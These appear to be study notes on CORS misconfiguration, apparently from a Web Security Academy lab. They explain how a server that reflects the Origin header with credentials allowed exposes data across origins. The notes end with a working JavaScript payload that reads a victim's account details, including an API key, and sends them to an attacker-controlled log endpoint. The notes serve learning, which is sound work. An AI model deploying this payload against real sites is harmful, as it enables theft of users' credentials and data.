# Cross-origin resource sharing (CORS)

It extends and adds flexibility to the same-origin policy (SOP)

CORS is not a protection against CSRF

# Same-origin policy (SOP)

restrictive cross-origin specification that limits intereaction to outside domains. Prevents sites stealing private data from another site. Allows requests to other domains but no access to responses.

Some websites need full cross-origin access, can be done controlled with CORS.

CORS uses HTTP headers that define trusted web origins and properties like is auth access permited. Combined in header exchange browser and cross-origin web site to be accesed.

# Vulnerabilities

CORS to allow subdomains and 3rd parties.

## Server-generated ACAO header from client-specified Origin header

To allow from different domains can just grab the Origin header and put it on Access-Control-Allow-Origin.

`Access-Control-Allow-Origin: https://malicious-website.com`

`Access-Control-Allow-Credentials: true`

the Allow-Credentials is to include cookies.

### Example:

`/accountDetails` returns APIkey and cookies

`Origin: https://example.com`

`Origin reflected on Access-Control-Allow-Origin`

Malicius Server answers
~~~
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
~~~

Need to make the victim run this code, with XSS or sendig link and get the cookies.


